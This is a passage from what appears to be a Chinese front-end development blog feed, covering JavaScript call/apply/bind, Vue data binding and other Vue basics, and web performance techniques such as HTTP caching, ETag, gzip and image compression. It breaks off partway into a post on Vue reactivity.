<p>常见的用法，我们通常使用_this、that、self等保存this，方便在改变了上下文后继续引用到它<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> foo = &#123;</span><br><span class="line">    bar: <span class="number">1</span>,</span><br><span class="line">    eventBind: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> _this = <span class="keyword">this</span>;</span><br><span class="line">        $(<span class="string">'.oneClass'</span>).on(<span class="string">'click'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(_this.bar)   <span class="comment">// 1</span></span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>由于Javascript特有机制，上下文环境在 eventBind:function(){} 过渡到 $(‘.oneClass’).on(‘click’, function(event){}) 发生了改变。使用新的变量保存this这样的方法是有效的，使用bind()可以更优雅的解决<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> foo = &#123;</span><br><span class="line">    bar: <span class="number">1</span>,</span><br><span class="line">    eventBind: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $(<span class="string">'.oneClass'</span>).on(<span class="string">'click'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="keyword">this</span>.bar)  <span class="comment">// 1</span></span><br><span class="line">        &#125;.bind(<span class="keyword">this</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>再举一个简单的栗子🌰<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> bar = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.x)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> foo = &#123;</span><br><span class="line">    x: <span class="number">3</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bar()  <span class="comment">// undefined</span></span><br><span class="line"><span class="keyword">var</span> func = bar.bind(foo)</span><br><span class="line">func()  <span class="comment">// 3</span></span><br></pre></td></tr></table></figure></p>
<p>在创建了一个新函数func，使用bind()创建一个绑定函数，在执行的时候this被设置成foo，而不是直接调用bar()时的全局作用域</p>
<h2 id="三者比较"><a href="#三者比较" class="headerlink" title="三者比较"></a>三者比较</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">    x: <span class="number">886</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> foo = &#123;</span><br><span class="line">    getX: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.x</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(foo.getX.bind(obj)())  <span class="comment">// 886</span></span><br><span class="line"><span class="built_in">console</span>.log(foo.getX.call(obj))  <span class="comment">// 886</span></span><br><span class="line"><span class="built_in">console</span>.log(foo.getX.apply(obj))   <span class="comment">// 886</span></span><br></pre></td></tr></table></figure>
<p>三个输出都是886，不同的是bind方法后多了一个括号，当你希望改变上下文环境后并非立即执行，而是回调时执行，使用bind()方法，而call、apply会立即执行函数</p>
<p>总结：</p>
<ul>
<li>call、apply、bind三者都是用来改变函数的this对象的指向，并且第一个参数都是要指向的对象（也即函数执行的上下文）</li>
<li>三者都可以利用后续参数传参</li>
<li>bind是返回对应的函数，便于稍后调用，call和apply则是立即调用</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>vue的双向绑定</title>
    <url>/2018/08/11/vue%E7%9A%84%E5%8F%8C%E5%90%91%E7%BB%91%E5%AE%9A/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>MVVM模式的体现<br><a id="more"></a></p>
<h2 id="vue双向绑定"><a href="#vue双向绑定" class="headerlink" title="vue双向绑定"></a>vue双向绑定</h2><h3 id="原理（采用Object-defineProperty-数据劫持-发布订阅模式）"><a href="#原理（采用Object-defineProperty-数据劫持-发布订阅模式）" class="headerlink" title="原理（采用Object.defineProperty()数据劫持 + 发布订阅模式）"></a>原理（采用Object.defineProperty()数据劫持 + 发布订阅模式）</h3><p>通过ES5提供的Object.defineProperty()方法，监控对数据的操作（劫持各个属性的setter、getter，在数据变动时发布消息给订阅者，触发相应的监听回调），从而自动触发数据同步。并且由于是在不同的数据上触发同步，可以精确地将变更发送给绑定的视图，而不是对所有数据都进行一次检测。简单应用：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var obj = &#123;&#125;;</span><br><span class="line">Object.defineProperty(obj, &apos;hello&apos;, &#123;</span><br><span class="line">    get: function() &#123;</span><br><span class="line">        console.log(&apos;get方法获取值&apos;);</span><br><span class="line">    &#125;,</span><br><span class="line">    set: function(val) &#123;</span><br><span class="line">        console.log(&apos;set方法设置的值为：&apos; + val);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">obj.hello; // get方法获取值</span><br><span class="line">obj.hello = &apos;Hello World&apos;;</span><br></pre></td></tr></table></figure></p>
<p>Object.defineProperty()函数接受三个参数，且都是必须的：</p>
<ul>
<li>第一个参数：目标对象</li>
<li>第二个参数：需要定义的属性或方法的名字。</li>
<li>第三个参数：目标属性所拥有的特性。</li>
</ul>
<h3 id="具体步骤："><a href="#具体步骤：" class="headerlink" title="具体步骤："></a>具体步骤：</h3><ul>
<li>需要observe的数据对象进行递归遍历，包括子属性对象的属性，都加上 setter和getter这样的话，给这个对象的某个值赋值，就会触发setter，那么就能监听到了数据变化</li>
<li>compile解析模板指令，将模板中的变量替换成数据，然后初始化渲染页面视图，并将每个指令对应的节点绑定更新函数，添加监听数据的订阅者，一旦数据有变动，收到通知，更新视图</li>
<li>Watcher订阅者是Observer和Compile之间通信的桥梁，主要做的事情是:</li>
</ul>
<p>1、在自身实例化时往属性订阅器(dep)里面添加自己</p>
<p>2、自身必须有一个update()方法</p>
<p>3、待属性变动dep.notice()通知时，能调用自身的update()方法，并触发Compile中绑定的回调，则功成身退。</p>
<ul>
<li>MVVM作为数据绑定的入口，整合Observer、Compile和Watcher三者，通过Observer来监听自己的model数据变化，通过Compile来解析编译模板指令，最终利用Watcher搭起Observer和Compile之间的通信桥梁，达到数据变化 -&gt; 视图更新；视图交互变化(input) -&gt; 数据model变更的双向绑定效果。</li>
</ul>
<h3 id="如何使用"><a href="#如何使用" class="headerlink" title="如何使用"></a>如何使用</h3><p>假如我们要实现一个用户在输入框输入内容，页面上会自动更新的效果<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">html:</span><br><span class="line">&lt;div id=&quot;app&quot;&gt;</span><br><span class="line">  &lt;p&gt;&#123;&#123; message &#125;&#125;&lt;/p&gt;</span><br><span class="line">  &lt;input v-model=&quot;message&quot;&gt;&lt;/input&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">JS:</span><br><span class="line">var vm = new Vue(&#123;</span><br><span class="line">  el:&apos;app&apos;,</span><br><span class="line">  data: &#123;</span><br><span class="line">    message:&apos;Hello,this is Jayce!&apos;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p>
<p>v-model只是一个语法糖<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;input v-model=&quot;x&quot;&gt;</span><br></pre></td></tr></table></figure></p>
<p>相当于<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;input v-bind:value=&quot;x&quot; @input=&quot;x = $event&quot;&gt;</span><br></pre></td></tr></table></figure></p>
<p>原理是绑定了一个input事件，将x的值传递给子组件，如果子组件的值更新了，它会发出一个input事件，input会传来x最新的值，再将这个最新的值event赋值给x，从而实现双向绑定</p>
<h3 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h3><p>双向绑定给人最大的优越感就是方便，当data发生变化时，页面也会自动更新，但这也伴随着一个缺点，我们无从知道data是什么时候变的，是谁变的，变化后也没有人来通知你，虽然说watch可以用来监听data的变化，但这样岂不是变得更复杂，不如用单向数据绑定，Vuex的单向数据绑定就满足了这种控制欲，虽然牺牲了一部分便捷性，但是换来的却是更强的控制力。</p>
]]></content>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>vue常见知识点</title>
    <url>/2018/08/11/vue%E5%B8%B8%E8%A7%81%E7%9F%A5%E8%AF%86%E7%82%B9/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>梳理知识点<br><a id="more"></a></p>
<h2 id="vue框架与jQuery的区别"><a href="#vue框架与jQuery的区别" class="headerlink" title="vue框架与jQuery的区别"></a>vue框架与jQuery的区别</h2><p>jQuery是使用选择器（$）选取DOM对象，对其进行赋值、取值、事件绑定等操作，和原生的HTML的区别只在于可以更方便的选取和操作DOM对象，而数据和界面是在一起的。比如需要获取label标签的内容：$(“lable”).val(); 它还是依赖DOM元素的值。</p>
<p>Vue使用MVVM模式，通过数据来显示视图层而不是节点操作，主要业务逻辑都放在viewModel中，视图和数据不直接进行数据交流</p>
<h2 id="一个组件实例"><a href="#一个组件实例" class="headerlink" title="一个组件实例"></a>一个组件实例</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Vue.component(&apos;定义一个组件名,组件名最好是带小横线的写法，尽量不要使用驼峰命名法button-counter&apos;, &#123;</span><br><span class="line">    data: function() &#123;  // data必须返回一个函数</span><br><span class="line">        return &#123;</span><br><span class="line">            count: 0</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    template: `  // 模版下只能有一个根元素</span><br><span class="line">    &lt;button @click=&quot;count++&quot;&gt;You clicked me &#123;&#123; count &#125;&#125;times.&lt;/button&gt;</span><br><span class="line">    `</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>将这个组件作为自定义元素使用<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">html:</span><br><span class="line">&lt;div id=&quot;components-demo&quot;&gt;</span><br><span class="line">  &lt;button-counter&gt;&lt;/button-counter&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">JS:</span><br><span class="line">var vm = new Vue(&#123;</span><br><span class="line">  el: &apos;#components-demo&apos;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p>
<h2 id="实例生命周期钩子"><a href="#实例生命周期钩子" class="headerlink" title="实例生命周期钩子"></a>实例生命周期钩子</h2><p>1、什么是生命周期</p>
<p>每个Vue实例从创建到销毁的过程就是生命周期，它的经历包括开始创建、初始化数据、编译模版、挂载到DOM、渲染更新、卸载。可以分为10个阶段：创建前/后（create），挂载前/后（mount）、更新前/后（update）、启动前/后（active）、销毁前/后（destroy）</p>
<p>2、生命周期函数的作用</p>
<p>生命周期中有许多事件钩子，让我们在控制整个Vue实例的过程中更容易形成好的逻辑</p>
<ul>
<li>created 实例创建完成后调用，此阶段完成了数据的观测等，但尚未挂载， $el 还不可用。需要初始化处理一些数据时会比较有用 —-还未挂载</li>
<li>mounted el 挂载到实例上后调用，一般我们的第一个业务逻辑会在这里开始 。相当于 $(document).ready() —刚刚挂载</li>
<li>beforeDestroy 实例销毁之前调用。主要解绑一些使用 addEventListener 监听的事件等。</li>
</ul>
<p>3、第一次页面加载会触发哪几个钩子？DOM渲染在哪个周期就完成了？</p>
<p>第一次页面加载会触发beforeCreate、created、beforeMount、mounted这四个钩子</p>
<p>DOM渲染在mounted中就已完成</p>
<h2 id="computed计算属性的用法？与methods的区别"><a href="#computed计算属性的用法？与methods的区别" class="headerlink" title="computed计算属性的用法？与methods的区别"></a>computed计算属性的用法？与methods的区别</h2><p>官方解释：对于复杂的逻辑我们应该用计算属性，例如想多次引用一个翻转字符<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">html:</span><br><span class="line">&lt;div id=&quot;demo&quot;&gt;</span><br><span class="line">  &lt;p&gt;Original message: &quot;&#123;&#123; message &#125;&#125;&quot;&lt;/p&gt;</span><br><span class="line">  &lt;p&gt;Reversed message: &quot;&#123;&#123; reversedMessage &#125;&#125;&quot;&lt;/p&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">JS:</span><br><span class="line">var vm = new Vue(&#123;</span><br><span class="line">  el: &apos;demo&apos;,</span><br><span class="line">  data: &#123;</span><br><span class="line">    message: &apos;Hello&apos;</span><br><span class="line">  &#125;,</span><br><span class="line">  computed: &#123;</span><br><span class="line">    reversedMessage: function()&#123;</span><br><span class="line">      return this.message.split(&apos;&apos;).reverse().join(&apos;&apos;)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p>
<p>与methods的区别：</p>
<ul>
<li>两种方式的最终结果是一致的，但唯一不同的是计算属性是基于它们的依赖进行缓存的，也就是说只有在他的相关依赖发生改变时才会重新求值，而调用方法总是会在触发重新渲染时再次执行函数</li>
<li><p>当有一个性能开销巨大的项目时，它需要计算属性A，它需要遍历一个巨大的数组并且进行大量的运算，也有可能一些其他的计算属性依赖于属性A，假如没有缓存，每次调用属性都会重新对A进行一次计算，如果不希望有这些缓存，那么就可以用methods来代替</p>
<h2 id="v-if与v-show"><a href="#v-if与v-show" class="headerlink" title="v-if与v-show"></a>v-if与v-show</h2><p>1、区别</p>
</li>
<li><p>手段：v-if是动态的向DOM树内添加或者删除DOM元素；v-show是通过设置DOM元素的display样式属性控制显隐；</p>
</li>
<li>编译条件：v-if是惰性的，如果初始条件为假，则什么也不做，直到条件第一次变为真时，才会开始渲染条件块; v-show不管初始条件是什么，元素总是会被渲染，然后被缓存，而且DOM元素保留；</li>
<li>编译过程：v-if切换有一个局部编译/卸载的过程，它会在切换过程中合适地销毁和重建内部的事件监听和子组件；v-show只是简单的基于css切换；</li>
<li>性能消耗：v-if有更高的切换消耗；v-show有更高的初始渲染消耗；</li>
</ul>
<p>2、使用场景</p>
<p>v-if适合运行条件不大可能会改变；v-show适合频繁切换</p>
<ul>
<li>对于管理系统的权限列表的展示，可以使用v-if来渲染，如果用到v-show，对于用户没有的权限，在网页的源码中，仍然能够显示出该权限，如果用v-if，网页的源码中就不会显示出该权限。（在前后台分离情况下，后台不负责渲染页面的场景。）</li>
<li>对于前台页面的数据展示，推荐使用v-show，这样可以减少开发中不必要的麻烦。</li>
</ul>
<p>3、总结</p>
<p>两者都是用来控制元素的渲染。v-if会判断是否需要加载，只在需要时加载可减轻服务器压力，但具有更高的切换开销；v-show通过改变DOM元素的CSS的display属性，可以使用户操作更加流畅，但有更高的初始渲染开销。如果需要频繁切换状态就用v-show，若运行条件很少会改变，用v-if较好</p>
<h2 id="Vuex"><a href="#Vuex" class="headerlink" title="Vuex"></a>Vuex</h2><p>1、官方定义：专门为Vue.js应用程序开发的状态管理模式。它采用集中式存储管理应用的所有组件的状态，并以相应的规则保证状态以一种可预测的方式发生变化。</p>
<p>2、Vuex解决了什么问题</p>
<ul>
<li>组件之间的数据通信</li>
<li>使用单向数据流的方式进行数据的中心化管理（所谓的单向数据流，就是当用户进行操作的时候，会从组件发出一个 action，这个 action 流到 store 里面，触发 store 对状态进行改动，然后 store 又触发组件基于新的状态重新渲染）对于复杂的应用来说，Vuex实施统一管理，方便维护和跟踪</li>
</ul>
<p>3、举例说明Vuex的好处（反证法）</p>
<p>我们不好说为什么使用Vuex，但是如果在下面这种情况下不使用Vuex，将会带来很多弊端</p>
<p>假设在一个app里有四个tab，每个tab都需要获取用户的资料，如果数据在每个tab组件里都保存了一份，那么用户在手动更新了资料后，这四个tab都需要更新一遍用户资料来保证用户在每个地方看到的数据永远都是最新的。如果说每进一次tab都重新请求一下：</p>
<p>对于服务器来说，频繁请求数据会耗用很多资源，如果该app的用户数量足够多，那么每多出来的一次请求，对于公司来说都是一笔巨大的开支，但是如果数据都储存在store中，并且这四个tab读取的都是同一份数据，那么在用户更新了资料时，只需要更新store中的数据，这样在进这四个不同的tab时，就减少了四次请求</p>
<h2 id="vue-router"><a href="#vue-router" class="headerlink" title="vue-router"></a>vue-router</h2><p>1、什么是路由</p>
<p>根据路径选择不同的页面展示给用户（所有东西都是页面，也可以说是一个个组件，用路由在之间来回切换）</p>
<p>2、为什么使用路由</p>
<p>一般来说，每次请求一个地址都会发送给服务器进行处理，但是有些用户操作不需要请求服务器，直接在页面下修改逻辑就能达到目的，这种时候用路由就可以了。</p>
<p>3、前端路由是什么？如何实现</p>
<p>前端路由是找到与地址相匹配的组件并将它渲染出来，本质是：改变浏览器地址（更新视图）但不向服务器发出请求，有两种方法可以做到：</p>
<ul>
<li>hash模式 利用URL中的hash（“#”）</li>
<li>history模式 利用 history.pushState API 来完成URL跳转而无须重新加载页面</li>
</ul>
<p>两种模式的对比：</p>
<ul>
<li>Hash 模式只可以更改 # 后面的内容，History 模式可以通过 API 设置任意的同源 URL</li>
<li>History 模式可以通过 API 添加任意类型的数据到历史记录中，Hash 模式只能更改哈希值，也就是字符串</li>
<li>Hash 模式无需后端配置且兼容性好。History 模式在用户手动输入地址或者刷新页面的时候会发起 URL 请求，后端需要配置 index.html 页面用于匹配不到静态资源的时候</li>
</ul>
<p>4、vue-router实现步骤</p>
<p><1> 在首页中添加两个script标签导入vue和vue-router<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script src=&quot;js/vue.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;js/vue-router.js&quot;&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;div id=&quot;app&quot;&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;!-- 用 router-link 组件来导航、传入 to 属性来指定链接、&lt;router-link&gt; 默认会被渲染成一个 a 标签 --&gt;</span><br><span class="line">    &lt;router-link to=&quot;/&quot;&gt;Go to home&lt;/router-link&gt;</span><br><span class="line">    &lt;router-link to=&quot;/topic&quot;&gt;Go to topic&lt;/router-link&gt;</span><br><span class="line">    &lt;router-link to=&quot;/content&quot;&gt;Go to content&lt;/router-link&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!-- 路由出口，路由匹配到的组件将在这里被渲染出来 --&gt;</span><br><span class="line">  &lt;router-view&gt;&lt;/router-view&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure></1></p>
<p><2> 定义vue组件<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">const home = &#123; template: &apos;&lt;div&gt;this is home page&lt;/div&gt;&apos; &#125;</span><br><span class="line">const topic = &#123; template: &apos;&lt;div&gt;this is topic page&lt;/div&gt;&apos; &#125;</span><br><span class="line">const content = &#123; template: &apos;&lt;div&gt;this is content page&lt;/div&gt;&apos; &#125;</span><br></pre></td></tr></table></figure></2></p>
<p><3> 定义路由<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">const routes = [</span><br><span class="line">  &#123; path:&apos;/&apos;, component: home&#125;,</span><br><span class="line">  &#123; path:&apos;/topic&apos;, component: topic&#125;,</span><br><span class="line">  &#123; path:&apos;/content&apos;, component: content&#125;,</span><br><span class="line">]</span><br></pre></td></tr></table></figure></3></p>
<p><4> 创建router实例，并将定义的路由传入 const router = new VueRouter({ routes: routes })</4></p>
<p><5> 创建和挂载根实例<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">const app = new Vue(&#123;</span><br><span class="line">  router: router</span><br><span class="line">&#125;).$mount(&apos;#app&apos;)</span><br></pre></td></tr></table></figure></5></p>
]]></content>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>web前端性能优化</title>
    <url>/2018/08/14/web%E5%89%8D%E7%AB%AF%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>对于一个数据请求来说，可以分为发起网络请求、后端处理、浏览器响应三个步骤。浏览器缓存可以帮助我们在第一和第三步骤中优化性能。<br><a id="more"></a></p>
<h2 id="1、发送HTTP请求，使用Cache-Control"><a href="#1、发送HTTP请求，使用Cache-Control" class="headerlink" title="1、发送HTTP请求，使用Cache-Control"></a>1、发送HTTP请求，使用Cache-Control</h2><p>通过在 HTTP 协议添加Cache-Control头部来告诉浏览器当前资源是否缓存，帮助浏览器进行有条件请求。Cache-Control 的值可以是 public, private, no-cache, no-store, no-transform 等</p>
<ul>
<li>max-age(单位为 s) 设定缓存最大的有效时间，Cache-Control: max-age=3600 表示该资源在浏览器端一个小时内均有效。</li>
<li>s-maxage(单位是 s) 设定共享缓存时间，比如 CDN 或者代理。</li>
<li>no-store 网络资源不缓存，每次都到服务器上拉取。</li>
<li>no-cache 表示网络资源可以缓存一份，但使用前必须询问服务器此资源是不是最新的。</li>
<li>public 表明响应可以被任何对象（客户端，代理服务器等）缓存。</li>
<li>private 表明响应只能被单个用户缓存，其它用户或者代理服务器不能缓存这些数据。</li>
</ul>
<h2 id="2、发送HTTP请求，增加域名以并行下载资源"><a href="#2、发送HTTP请求，增加域名以并行下载资源" class="headerlink" title="2、发送HTTP请求，增加域名以并行下载资源"></a>2、发送HTTP请求，增加域名以并行下载资源</h2><p>把组件分散到不同的域名下最大化并行下载数。</p>
<p>但是对于需要减少DNS查询来说，就要减少域名，想增加HTTP请求的并发数又要增加域名，两者产生矛盾。权衡之下，如果文件很少，就没有必要增加域名；反之，就增加域名。基于DNS查询的副作用，最佳的不同域名数是2-4。</p>
<h2 id="3、接收响应时，使用Etag"><a href="#3、接收响应时，使用Etag" class="headerlink" title="3、接收响应时，使用Etag"></a>3、接收响应时，使用Etag</h2><p>Etag是服务器和浏览器之间判断浏览器缓存中某个组件是否未发生改变的一种机制，服务器像下面这样设置Etag：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Last-Modified: Tue, 12 Dec 2006 03:03:59 GMT</span><br><span class="line">ETag: &quot;10c24bc-4ab-457e1c1f&quot;  // md5</span><br><span class="line">Content-Length: 12195</span><br></pre></td></tr></table></figure></p>
<p>之后，当浏览器要验证该组件是否修改过，会在请求头里设置if-None-Match，并附上这个md5值。于是在请求的时候，如果这个md5值和你之前文件的md5值一样，说明文件没有更新，不需要下载<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET /i/yahoo.gif HTTP/1.1</span><br><span class="line">Host: us.yimg.com</span><br><span class="line">If-Modified-Since: Tue, 12 Dec 2006 03:03:59 GMT</span><br><span class="line">If-None-Match: &quot;10c24bc-4ab-457e1c1f&quot;  // 与原文件相同，返回304</span><br><span class="line">HTTP/1.1 304 Not Modified</span><br></pre></td></tr></table></figure></p>
<p>Etag和缓存的区别在于：缓存不会发请求，而ETag会发请求，并比较md5值是否一样，从而返回304。</p>
<h2 id="4、接收响应时，使用Gzip压缩"><a href="#4、接收响应时，使用Gzip压缩" class="headerlink" title="4、接收响应时，使用Gzip压缩"></a>4、接收响应时，使用Gzip压缩</h2><p>传输时用Gzip压缩，压缩可以通过减少http响应的大小减少响应时间。从HTTP/1.1开始，客户端通过http请求中的Accept-Encoding头部来提示支持的压缩：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Accept-Encoding: gzip, deflate</span><br></pre></td></tr></table></figure></p>
<p>如果服务器看到这个头部，它可能会选用列表中的某个方法压缩响应。服务器通过Content-Encoding头部提示客户端：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Content-Encoding: gzip</span><br></pre></td></tr></table></figure></p>
<p>gzip一般可减小响应的70%。尽可能去压缩更多类型的文件。html，脚本，样式，xml和json等等都应该被压缩，而图片，pdf等等不应该被gzip，因为它们本身已被压缩过。</p>
<h2 id="5、对于CSS和JS文件，使用CDN（Content-Delivery-Network）"><a href="#5、对于CSS和JS文件，使用CDN（Content-Delivery-Network）" class="headerlink" title="5、对于CSS和JS文件，使用CDN（Content Delivery Network）"></a>5、对于CSS和JS文件，使用CDN（Content Delivery Network）</h2><p>用户离服务器越近，会减少响应时间。CDN是一群不同地点的服务器，它将资源分布到世界各地，这样不同地点的人会根据距离选择离得最近的服务器，从而使页面加载更快</p>
<h2 id="6、调整CSS和JS文件位置"><a href="#6、调整CSS和JS文件位置" class="headerlink" title="6、调整CSS和JS文件位置"></a>6、调整CSS和JS文件位置</h2><p>将CSS放在头部，让它能够尽早下载；JS放在body最后，确保JS不会阻塞HTML加载，以保证用户先看到一个完整画面</p>
<p>对于CSS文件来说，IE不会阻塞HTML，会在看到标签时就渲染在页面上，回头等CSS加载完后，再次重新渲染页面；而Chrome会阻塞HTML，它会在CSS下载好之后再渲染标签。所以最好的方式是将CSS文件放在一开始就需要加载的位置上</p>
<p>对于JS文件，不管是IE还是Chrome，它都会阻塞HTML的渲染，所以干脆将它放在body最后，让它最后一个加载。</p>
<h2 id="7、压缩图片"><a href="#7、压缩图片" class="headerlink" title="7、压缩图片"></a>7、压缩图片</h2><p><1> 优化jpg和png</1></p>
<p>使用 pngcrush 或其它工具压缩png<br>使用 jpegtran 或其它工具压缩jpeg</p>
<p>如果真的需要追求各种图片的极限压缩，可以参阅这些工具的文档，但是对于一般的Web应用，面对的图片种类多样，几乎不可能在工程中实现对每种工具的独立配置，因此推荐使用以下工具来进行优化。</p>
<ul>
<li>ImageOptim (Mac) 主页：<a href="https://imageoptim.com/" target="_blank" rel="noopener">https://imageoptim.com/</a><br>Mac平台下非常赞的图片优化工具，只需要把需要优化的图片拖拽进ImageOptim，就能够完成对图片的优化。设置选择的也很丰富，目前支持JPG和PNG的优化。</li>
<li>Kraken (Web) 主页：<a href="https://kraken.io/" target="_blank" rel="noopener">https://kraken.io/</a><br>在免费模式下可以上传图片，优化后打包下载。适合偶尔有图片优化需求，或者不在开发机上没有优化软件可以使用的情况。</li>
<li>智图 (Web) 主页：<a href="http://zhitu.tencent.com/" target="_blank" rel="noopener">http://zhitu.tencent.com/</a><br>腾讯ISUX团队有篇文章介绍智图：<a href="http://isux.tencent.com/zhitu.html" target="_blank" rel="noopener">http://isux.tencent.com/zhitu.html</a></li>
</ul>
<p><2> 优化SVG</2></p>
<p>SVGO 工具可以缩减SVG文件的体积；由于SVG是基于XML的格式，本质上是纯文本，所以还可以采用GZIP压缩来减小传输大小，但这需要一些服务器配置。</p>
<h3 id="自动优化"><a href="#自动优化" class="headerlink" title="自动优化"></a>自动优化</h3><p>主要介绍CDN、Grunt/Gulp、Google PageSpeed三种方式。</p>
<p>1、CDN</p>
<p>CDN七牛和又拍在这方面都做了大量工作。其工作方式为，向CDN请求图片的URL参数中包含了图片处理的参数（格式、宽高等），CDN服务器根据请求生成所需的图片，发送到用户浏览器。</p>
<p>七牛云存储的图片处理接口极其丰富，覆盖了图片的大部分基本操作，例如：</p>
<ul>
<li>图片裁剪，支持多种裁剪方式（如按长边、短边、填充、拉伸等）</li>
<li>图片格式转换，支持JPG, GIF, PNG, WebP等，支持不同的图片压缩率</li>
<li>图片处理，支持图片水印、高斯模糊、重心处理等</li>
</ul>
<p>2、Grunt/Gulp</p>
<p>用于图片优化的Grunt组件：grunt-image。前端工程师的重复性工作，例如合并静态资源、压缩JS和CSS文件、编译SASS等都可以使用Grunt等自动化工具批量完成，图片优化也是如此。</p>
<p>grunt-image非常强大，按照作者的介绍，其内部加载的图片优化工具包括了pngquant, optipng, advpng, zopflipng, pngcrush, pngout, mozjpeg, jpegRecompress, jpegoptim, gifsicle和svgo。支持批量自动优化PNG, JPG, SVG和GIF，速度也不错，配置方式支持单图片优化和全目录优化</p>
<p>3、Google PageSpeed</p>
<p>Google PageSpeed这个服务器模块，可以在apache或ngnix中加载，通过在服务器配置文件中进行设置来进行自动化的优化。对于图片格式转换、图片优化甚至图片LazyLoad都有相关选项。</p>
]]></content>
      <tags>
        <tag>性能优化</tag>
      </tags>
  </entry>
  <entry>
    <title>vue数据响应式</title>
    <url>/2022/04/29/vue%E6%95%B0%E6%8D%AE%E5%93%8D%E5%BA%94%E5%BC%8F/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="问题引入：Vue对data做了什么"><a href="#问题引入：Vue对data做了什么" class="headerlink" title="问题引入：Vue对data做了什么"></a>问题引入：Vue对data做了什么</h2><h4 id="data值变了，例子中-myData-在传入前和传入后，两次log出的结果不一样"><a href="#data值变了，例子中-myData-在传入前和传入后，两次log出的结果不一样" class="headerlink" title="data值变了，例子中 myData 在传入前和传入后，两次log出的结果不一样"></a>data值变了，例子中 myData 在传入前和传入后，两次log出的结果不一样</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> myData = &#123;</span><br><span class="line">    n: <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(myData)  <span class="comment">// 第一次log出的结果为 &#123; n: 0 &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> vm = <span class="keyword">new</span> Vue 